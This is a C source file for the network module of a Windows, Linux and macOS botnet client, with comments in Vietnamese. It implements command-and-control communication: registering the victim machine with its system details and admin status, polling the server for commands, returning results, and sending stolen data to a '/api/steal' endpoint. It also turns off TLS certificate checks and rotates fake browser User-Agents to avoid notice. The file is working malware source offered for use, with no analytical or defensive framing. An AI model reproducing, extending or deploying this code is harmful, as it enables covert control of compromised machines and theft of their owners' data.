/**
 * bot_network.c
 * Trien khai cac ham giao tiep mang cho bot
 * Ho tro: HTTPS, DNS fallback, WebSocket (neu can)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #include <winhttp.h>
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "winhttp.lib")
    #pragma comment(lib, "crypt32.lib")
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <unistd.h>
    #include <fcntl.h>
    #include <errno.h>
    #include <openssl/ssl.h>
    #include <openssl/err.h>
#endif

#include "bot_network.h"
#include "bot_crypto.h"

/* Bien toan cuc cho SSL context */
#ifdef _WIN32
static HINTERNET g_winhttp_session = NULL;
#else
static SSL_CTX* g_ssl_ctx = NULL;
#endif

/* Danh sach User-Agent ngau nhien */
static const char* USER_AGENTS[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
};
#define SO_USER_AGENTS (sizeof(USER_AGENTS) / sizeof(USER_AGENTS[0]))

/**
 * Tao user agent ngau nhien
 */
void tao_user_agent(char* buffer, size_t kich_thuoc) {
    int chi_so = rand() % SO_USER_AGENTS;
    strncpy(buffer, USER_AGENTS[chi_so], kich_thuoc - 1);
    buffer[kich_thuoc - 1] = '\0';
}

/**
 * Phan giai DNS su dung getaddrinfo
 */
int phan_giai_dns(const char* ten_mien, char* ip_out, size_t ip_size) {
    struct addrinfo hints;
    struct addrinfo* result;
    
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET; /* Chi IPv4 */
    hints.ai_socktype = SOCK_STREAM;
    
    int ret = getaddrinfo(ten_mien, NULL, &hints, &result);
    if (ret != 0) {
        fprintf(stderr, "[DNS] Loi phan giai %s: %s\n", ten_mien, gai_strerror(ret));
        return -1;
    }
    
    struct sockaddr_in* addr = (struct sockaddr_in*)result->ai_addr;
    const char* ip_str = inet_ntop(AF_INET, &(addr->sin_addr), ip_out, ip_size);
    
    freeaddrinfo(result);
    
    if (ip_str == NULL) {
        return -1;
    }
    
    return 0;
}

#ifdef _WIN32
/* ==================== WINDOWS IMPLEMENTATION ==================== */

/**
 * Khoi tao WinHTTP session
 */
static int khoi_tao_winhttp(void) {
    if (g_winhttp_session != NULL) {
        return 0; /* Da khoi tao */
    }
    
    g_winhttp_session = WinHttpOpen(L"C2Bot/1.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    
    if (g_winhttp_session == NULL) {
        fprintf(stderr, "[NET] Loi khoi tao WinHTTP: %lu\n", GetLastError());
        return -1;
    }
    
    /* Dat timeout */
    WinHttpSetTimeouts(g_winhttp_session, 
                       NETWORK_TIMEOUT * 1000,  /* Resolve */
                       NETWORK_TIMEOUT * 1000,  /* Connect */
                       NETWORK_TIMEOUT * 1000,  /* Send */
                       NETWORK_TIMEOUT * 1000); /* Receive */
    
    return 0;
}

/**
 * Gui HTTP POST request qua WinHTTP
 */
static int winhttp_post(const char* server_url, const char* path, 
                        const char* headers, const char* body,
                        char* response, size_t response_size) {
    if (khoi_tao_winhttp() != 0) {
        return -1;
    }
    
    /* Parse URL */
    URL_COMPONENTS url_comp;
    ZeroMemory(&url_comp, sizeof(url_comp));
    url_comp.dwStructSize = sizeof(url_comp);
    
    wchar_t hostname[256] = {0};
    wchar_t url_path[1024] = {0};
    url_comp.lpszHostName = hostname;
    url_comp.dwHostNameLength = 256;
    url_comp.lpszUrlPath = url_path;
    url_comp.dwUrlPathLength = 1024;
    
    /* Chuyen doi URL tu char sang wchar */
    wchar_t wide_url[2048];
    MultiByteToWideChar(CP_UTF8, 0, server_url, -1, wide_url, 2048);
    
    if (!WinHttpCrackUrl(wide_url, 0, 0, &url_comp)) {
        fprintf(stderr, "[NET] Loi parse URL\n");
        return -1;
    }
    
    /* Ket noi den server */
    HINTERNET connect = WinHttpConnect(g_winhttp_session, hostname, 
                                        url_comp.nPort, 0);
    if (connect == NULL) {
        fprintf(stderr, "[NET] Loi ket noi den server\n");
        return -1;
    }
    
    DWORD flags = (url_comp.nScheme == INTERNET_SCHEME_HTTPS) ? 
                  WINHTTP_FLAG_SECURE : 0;
    
    HINTERNET request = WinHttpOpenRequest(connect, L"POST", url_path,
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (request == NULL) {
        fprintf(stderr, "[NET] Loi tao request\n");
        WinHttpCloseHandle(connect);
        return -1;
    }
    
    /* Bo qua loi chung chi (tu sinh cert) */
    if (flags & WINHTTP_FLAG_SECURE) {
        DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, 
                         &sec_flags, sizeof(sec_flags));
    }
    
    /* Them headers */
    wchar_t wide_headers[4096];
    MultiByteToWideChar(CP_UTF8, 0, headers, -1, wide_headers, 4096);
    
    if (!WinHttpSendRequest(request, wide_headers, wcslen(wide_headers),
                            (LPVOID)body, (DWORD)strlen(body),
                            (DWORD)strlen(body), 0)) {
        fprintf(stderr, "[NET] Loi gui request: %lu\n", GetLastError());
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        return -1;
    }
    
    /* Nhan response */
    if (!WinHttpReceiveResponse(request, NULL)) {
        fprintf(stderr, "[NET] Loi nhan response\n");
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        return -1;
    }
    
    /* Doc du lieu response */
    DWORD bytes_doc = 0;
    DWORD tong_bytes = 0;
    char* buffer = response;
    size_t buffer_con_lai = response_size - 1;
    
    while (WinHttpReadData(request, buffer, (DWORD)buffer_con_lai, &bytes_doc)) {
        if (bytes_doc == 0) break;
        tong_bytes += bytes_doc;
        buffer += bytes_doc;
        buffer_con_lai -= bytes_doc;
        if (buffer_con_lai <= 0) break;
    }
    
    response[tong_bytes] = '\0';
    
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    
    return (int)tong_bytes;
}

/**
 * Ket noi den C2 server (Windows)
 */
int ket_noi_c2(const char* server_url, const char* bot_id,
               const char* encryption_key, const char* user_agent) {
    (void)bot_id;
    (void)encryption_key;
    (void)user_agent;
    
    /* Khoi tao WinHTTP */
    if (khoi_tao_winhttp() != 0) {
        return 0;
    }
    
    /* Thu ket noi den /api/health */
    char headers[2048];
    snprintf(headers, sizeof(headers),
             "Content-Type: application/json\r\nUser-Agent: %s\r\n", user_agent);
    
    char response[4096] = {0};
    int ret = winhttp_post(server_url, "/api/health", headers, "{}", 
                           response, sizeof(response));
    
    if (ret < 0) {
        return 0; /* Ket noi that bai */
    }
    
    /* Kiem tra response co chua "success" */
    if (strstr(response, "success") != NULL) {
        return 1;
    }
    
    return 0;
}

/**
 * Dang ky bot (Windows)
 */
int dang_ky_bot(const char* server_url, char* bot_id_out, size_t bot_id_size,
                char* enc_key_out, size_t enc_key_size) {
    char headers[2048];
    char body[2048];
    char response[8192];
    char user_agent[256];
    
    tao_user_agent(user_agent, sizeof(user_agent));
    
    /* Tao thong tin he thong de dang ky */
    char hostname[256] = {0};
    DWORD hostname_size = sizeof(hostname);
    GetComputerNameA(hostname, &hostname_size);
    
    char os_info[64] = "Windows";
    SYSTEM_INFO sys_info;
    GetSystemInfo(&sys_info);
    
    char arch[16] = "x64";
    if (sys_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
        strcpy(arch, "x86");
    }
    
    /* Lay thong tin CPU */
    char cpu[128] = "Unknown CPU";
    HKEY hkey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                      "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
                      0, KEY_READ, &hkey) == ERROR_SUCCESS) {
        DWORD cpu_size = sizeof(cpu);
        RegQueryValueExA(hkey, "ProcessorNameString", NULL, NULL, 
                         (LPBYTE)cpu, &cpu_size);
        RegCloseKey(hkey);
    }
    
    /* Lay RAM */
    MEMORYSTATUSEX mem_status;
    mem_status.dwLength = sizeof(mem_status);
    GlobalMemoryStatusEx(&mem_status);
    char ram[32];
    snprintf(ram, sizeof(ram), "%llu MB", mem_status.ullTotalPhys / (1024 * 1024));
    
    snprintf(body, sizeof(body),
             "{\"hostname\":\"%s\",\"os\":\"%s\",\"arch\":\"%s\","
             "\"cpu\":\"%s\",\"ram\":\"%s\",\"gpu\":\"Unknown\","
             "\"disk\":\"Unknown\",\"local_ip\":\"127.0.0.1\","
             "\"is_admin\":%s}",
             hostname, os_info, arch, cpu, ram,
             IsUserAnAdmin() ? "true" : "false");
    
    snprintf(headers, sizeof(headers),
             "Content-Type: application/json\r\nUser-Agent: %s\r\n", user_agent);
    
    int ret = winhttp_post(server_url, "/api/register", headers, body,
                           response, sizeof(response));
    
    if (ret < 0) {
        return -1;
    }
    
    /* Parse response de lay bot_id va encryption_key */
    const char* pos = strstr(response, "\"bot_id\"");
    if (pos != NULL) {
        pos = strchr(pos, ':');
        if (pos != NULL) {
            pos++;
            while (*pos == ' ' || *pos == '"') pos++;
            int i = 0;
            while (*pos != '"' && *pos != '\0' && i < (int)bot_id_size - 1) {
                bot_id_out[i++] = *pos++;
            }
            bot_id_out[i] = '\0';
        }
    }
    
    pos = strstr(response, "\"encryption_key\"");
    if (pos != NULL) {
        pos = strchr(pos, ':');
        if (pos != NULL) {
            pos++;
            while (*pos == ' ' || *pos == '"') pos++;
            int i = 0;
            while (*pos != '"' && *pos != '\0' && i < (int)enc_key_size - 1) {
                enc_key_out[i++] = *pos++;
            }
            enc_key_out[i] = '\0';
        }
    }
    
    return (strlen(bot_id_out) > 0) ? 0 : -1;
}

/**
 * Checkin va nhan lenh (Windows)
 */
int checkin_nhan_lenh(const char* server_url, const char* bot_id,
                      const char* encryption_key, char* lenh_out, size_t lenh_size) {
    char headers[2048];
    char response[16384];
    char user_agent[256];
    
    tao_user_agent(user_agent, sizeof(user_agent));
    
    snprintf(headers, sizeof(headers),
             "Content-Type: application/json\r\n"
             "User-Agent: %s\r\n"
             "X-Bot-ID: %s\r\n",
             user_agent, bot_id);
    
    int ret = winhttp_post(server_url, "/api/checkin", headers, "{}",
                           response, sizeof(response));
    
    if (ret < 0) {
        return -1;
    }
    
    /* Kiem tra co lenh khong */
    if (strstr(response, "\"commands\"") != NULL) {
        /* Co lenh, trich xuat lenh dau tien */
        const char* pos = strstr(response, "\"action\"");
        if (pos != NULL) {
            /* Copy toan bo phan commands */
            strncpy(lenh_out, response, lenh_size - 1);
            lenh_out[lenh_size - 1] = '\0';
            return 1;
        }
    }
    
    return 0;
}

/**
 * Gui ket qua (Windows)
 */
int gui_ket_qua(const char* server_url, const char* bot_id,
                const char* encryption_key, const char* du_lieu) {
    char headers[2048];
    char response[4096];
    char user_agent[256];
    
    tao_user_agent(user_agent, sizeof(user_agent));
    
    snprintf(headers, sizeof(headers),
             "Content-Type: application/json\r\n"
             "User-Agent: %s\r\n"
             "X-Bot-ID: %s\r\n",
             user_agent, bot_id);
    
    int ret = winhttp_post(server_url, "/api/result", headers, (char*)du_lieu,
                           response, sizeof(response));
    
    return (ret >= 0) ? 0 : -1;
}

/**
 * Gui du lieu steal (Windows)
 */
int gui_du_lieu_steal(const char* server_url, const char* bot_id,
                      const char* encryption_key, const char* loai_du_lieu,
                      const char* du_lieu) {
    char headers[2048];
    char body[16384];
    char response[4096];
    char user_agent[256];
    
    tao_user_agent(user_agent, sizeof(user_agent));
    
    snprintf(body, sizeof(body),
             "{\"data_type\":\"%s\",\"data\":\"%s\"}",
             loai_du_lieu, du_lieu);
    
    snprintf(headers, sizeof(headers),
             "Content-Type: application/json\r\n"
             "User-Agent: %s\r\n"
             "X-Bot-ID: %s\r\n",
             user_agent, bot_id);
    
    int ret = winhttp_post(server_url, "/api/steal", headers, body,
                           response, sizeof(response));
    
    return (ret >= 0) ? 0 : -1;
}

/* DNS fallback (Windows) - stub */
int dns_tunnel_gui(const char* ten_mien, const char* du_lieu) {
    (void)ten_mien;
    (void)du_lieu;
    return -1; /* Chua trien khai */
}

int dns_tunnel_nhan(const char* ten_mien, char* buffer, size_t kich_thuoc) {
    (void)ten_mien;
    (void)buffer;
    (void)kich_thuoc;
    return -1; /* Chua trien khai */
}

#else
/* ==================== LINUX/MACOS IMPLEMENTATION ==================== */

/**
 * Khoi tao OpenSSL
 */
static int khoi_tao_openssl(void) {
    if (g_ssl_ctx != NULL) {
        return 0;
    }
    
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    
    g_ssl_ctx = SSL_CTX_new(TLS_client_method());
    if (g_ssl_ctx == NULL) {
        fprintf(stderr, "[NET] Loi tao SSL context\n");
        return -1;
    }
    
    /* Bo qua xac thuc chung chi */
    SSL_CTX_set_verify(g_ssl_ctx, SSL_VERIFY_NONE, NULL);
    
    return 0;
}

/**
 * Gui HTTP POST request qua socket + OpenSSL (Linux/MacOS)
 */
static int ssl_post(const char* server_url, const char* path,
                    const char* headers, const char* body,
                    char* response, size_t response_size) {
    if (khoi_tao_openssl() != 0) {
        return -1;
    }
    
    /* Parse hostname va port tu URL */
    char hostname[256] = {0};
    int port = 443;
    
    const char* pos = strstr(server_url, "://");
    if (pos != NULL) {
        pos += 3;
    } else {
        pos = server_url;
    }
    
    const char* colon = strchr(pos, ':');
    const char* slash = strchr(pos, '/');
    
    if (colon != NULL && (slash == NULL || colon < slash)) {
        size_t host_len = colon - pos;
        strncpy(hostname, pos, host_len);
        hostname[host_len] = '\0';
        port = atoi(colon + 1);
    } else if (slash != NULL) {
        size_t host_len = slash - pos;
        strncpy(hostname, pos, host_len);
        hostname[host_len] = '\0';
    } else {
        strncpy(hostname, pos, sizeof(hostname) - 1);
    }
    
    /* Phan giai DNS */
    char ip[64];
    if (phan_giai_dns(hostname, ip, sizeof(ip)) != 0) {
        return -1;
    }
    
    /* Tao socket */
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("[NET] Loi tao socket");
        return -1;
    }
    
    /* Dat timeout */
    struct timeval tv;
    tv.tv_sec = NETWORK_TIMEOUT;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    
    /* Ket noi */
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("[NET] Loi ket noi");
        close(sock);
        return -1;
    }
    
    /* SSL ket noi */
    SSL* ssl = SSL_new(g_ssl_ctx);
    SSL_set_fd(ssl, sock);
    
    if (SSL_connect(ssl) != 1) {
        fprintf(stderr, "[NET] Loi SSL handshake\n");
        SSL_free(ssl);
        close(sock);
        return -1;
    }
    
    /* Tao HTTP request */
    char request[16384];
    int req_len = snprintf(request, sizeof(request),
                          "POST %s HTTP/1.1\r\n"
                          "Host: %s\r\n"
                          "%s"
                          "Content-Length: %zu\r\n"
                          "Connection: close\r\n"
                          "\r\n"
                          "%s",
                          path, hostname, headers, strlen(body), body);
    
    /* Gui request */
    int bytes_gui = SSL_write(ssl, request, req_len);
    if (bytes_gui <= 0) {
        fprintf(stderr, "[NET] Loi gui request\n");
        SSL_free(ssl);
        close(sock);
        return -1;
    }
    
    /* Nhan response */
    int tong_bytes = 0;
    int bytes_nhan;
    char* buffer = response;
    size_t buffer_con_lai = response_size - 1;
    
    while ((bytes_nhan = SSL_read(ssl, buffer, buffer_con_lai)) > 0) {
        tong_bytes += bytes_nhan;
        buffer += bytes_nhan;
        buffer_con_lai -= bytes_nhan;
        if (buffer_con_lai <= 0) break;
    }
    
    response[tong_bytes] = '\0';
    
    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(sock);
    
    return tong_bytes;
}

/**
 * Ket noi den C2 server (Linux/MacOS)
 */
int ket_noi_c2(const char* server_url, const char* bot_id,
               const char* encryption_key, const char* user_agent) {
    (void)bot_id;
    (void)encryption_key;
    
    char headers[2048];
    snprintf(headers, sizeof(headers),
             "Content-Type: application/json\r\nUser-Agent: %s\r\n", user_agent);
    
    char response[4096] = {0};
    int ret = ssl_post(server_url, "/api/health", headers, "{}",
                       response, sizeof(response));
    
    if (ret < 0) {
        return 0;
    }
    
    if (strstr(response, "success") != NULL) {
        return 1;
    }
    
    return 0;
}

/**
 * Dang ky bot (Linux/MacOS)
 */
int dang_ky_bot(const char* server_url, char* bot_id_out, size_t bot_id_size,
                char* enc_key_out, size_t enc_key_size) {
    char headers[2048];
    char body[2048];
    char response[8192];
    char user_agent[256];
    
    tao_user_agent(user_agent, sizeof(user_agent));
    
    /* Lay thong tin he thong */
    char hostname[256] = {0};
    gethostname(hostname, sizeof(hostname));
    
    /* Lay OS */
    char os_info[64] = "Linux";
#ifdef __APPLE__
    strcpy(os_info, "MacOS");
#endif
    
    /* Lay CPU info */
    char cpu[128] = "Unknown CPU";
    FILE* cpuinfo = fopen("/proc/cpuinfo", "r");
    if (cpuinfo != NULL) {
        char line[256];
        while (fgets(line, sizeof(line), cpuinfo)) {
            if (strstr(line, "model name") != NULL) {
                char* colon = strchr(line, ':');
                if (colon != NULL) {
                    strncpy(cpu, colon + 2, sizeof(cpu) - 1);
                    /* Xoa newline */
                    char* nl = strchr(cpu, '\n');
                    if (nl) *nl = '\0';
                }
                break;
            }
        }
        fclose(cpuinfo);
    }
    
    /* Lay RAM */
    char ram[32] = "Unknown";
    FILE* meminfo = fopen("/proc/meminfo", "r");
    if (meminfo != NULL) {
        char line[256];
        while (fgets(line, sizeof(line), meminfo)) {
            if (strstr(line, "MemTotal") != NULL) {
                char* colon = strchr(line, ':');
                if (colon != NULL) {
                    strncpy(ram, colon + 2, sizeof(ram) - 1);
                    char* nl = strchr(ram, '\n');
                    if (nl) *nl = '\0';
                }
                break;
            }
        }
        fclose(meminfo);
    }
    
    snprintf(body, sizeof(body),
             "{\"hostname\":\"%s\",\"os\":\"%s\",\"arch\":\"x64\","
             "\"cpu\":\"%s\",\"ram\":\"%s\",\"gpu\":\"Unknown\","
             "\"disk\":\"Unknown\",\"local_ip\":\"127.0.0.1\","
             "\"is_admin\":%s}",
             hostname, os_info, cpu, ram,
             (getuid() == 0) ? "true" : "false");
    
    snprintf(headers, sizeof(headers),
             "Content-Type: application/json\r\nUser-Agent: %s\r\n", user_agent);
    
    int ret = ssl_post(server_url, "/api/register", headers, body,
                       response, sizeof(response));
    
    if (ret < 0) {
        return -1;
    }
    
    /* Parse response */
    const char* pos = strstr(response, "\"bot_id\"");
    if (pos != NULL) {
        pos = strchr(pos, ':');
        if (pos != NULL) {
            pos++;
            while (*pos == ' ' || *pos == '"') pos++;
            int i = 0;
            while (*pos != '"' && *pos != '\0' && i < (int)bot_id_size - 1) {
                bot_id_out[i++] = *pos++;
            }
            bot_id_out[i] = '\0';
        }
    }
    
    pos = strstr(response, "\"encryption_key\"");
    if (pos != NULL) {
        pos = strchr(pos, ':');
        if (pos != NULL) {
            pos++;
            while (*pos == ' ' || *pos == '"') pos++;
            int i = 0;
            while (*pos != '"' && *pos != '\0' && i < (int)enc_key_size - 1) {
                enc_key_out[i++] = *pos++;
            }
            enc_key_out[i] = '\0';
        }
    }
    
    return (strlen(bot_id_out) > 0) ? 0 : -1;
}

/**
 * Checkin va nhan lenh (Linux/MacOS)
 */
int checkin_nhan_lenh(const char* server_url, const char* bot_id,
                      const char* encryption_key, char* lenh_out, size_t lenh_size) {
    char headers[2048];
    char response[16384];
    char user_agent[256];
    
    tao_user_agent(user_agent, sizeof(user_agent));
    
    snprintf(headers, sizeof(headers),
             "Content-Type: application/json\r\n"
             "User-Agent: %s\r\n"
             "X-Bot-ID: %s\r\n",
             user_agent, bot_id);
    
    int ret = ssl_post(server_url, "/api/checkin", headers, "{}",
                       response, sizeof(response));
    
    if (ret < 0) {
        return -1;
    }
    
    if (strstr(response, "\"commands\"") != NULL) {
        strncpy(lenh_out, response, lenh_size - 1);
        lenh_out[lenh_size - 1] = '\0';
        return 1;
    }
    
    return 0;
}

/**
 * Gui ket qua (Linux/MacOS)
 */
int gui_ket_qua(const char* server_url, const char* bot_id,
                const char* encryption_key, const char* du_lieu) {
    char headers[2048];
    char response[4096];
    char user_agent[256];
    
    tao_user_agent(user_agent, sizeof(user_agent));
    
    snprintf(headers, sizeof(headers),
             "Content-Type: application/json\r\n"
             "User-Agent: %s\r\n"
             "X-Bot-ID: %s\r\n",
             user_agent, bot_id);
    
    int ret = ssl_post(server_url, "/api/result", headers, (char*)du_lieu,
                       response, sizeof(response));
    
    return (ret >= 0) ? 0 : -1;
}

/**
 * Gui du lieu steal (Linux/MacOS)
 */
int gui_du_lieu_steal(const char* server_url, const char* bot_id,
                      const char* encryption_key, const char* loai_du_lieu,
                      const char* du_lieu) {
    char headers[2048];
    char body[16384];
    char response[4096];
    char user_agent[256];
    
    tao_user_agent(user_agent, sizeof(user_agent));
    
    snprintf(body, sizeof(body),
             "{\"data_type\":\"%s\",\"data\":\"%s\"}",
             loai_du_lieu, du_lieu);
    
    snprintf(headers, sizeof(headers),
             "Content-Type: application/json\r\n"
             "User-Agent: %s\r\n"
             "X-Bot-ID: %s\r\n",
             user_agent, bot_id);
    
    int ret = ssl_post(server_url, "/api/steal", headers, body,
                       response, sizeof(response));
    
    return (ret >= 0) ? 0 : -1;
}

/* DNS fallback (Linux) - stub */
int dns_tunnel_gui(const char* ten_mien, const char* du_lieu) {
    (void)ten_mien;
    (void)du_lieu;
    return -1;
}

int dns_tunnel_nhan(const char* ten_mien, char* buffer, size_t kich_thuoc) {
    (void)ten_mien;
    (void)buffer;
    (void)kich_thuoc;
    return -1;
}

#endif /* _WIN32 */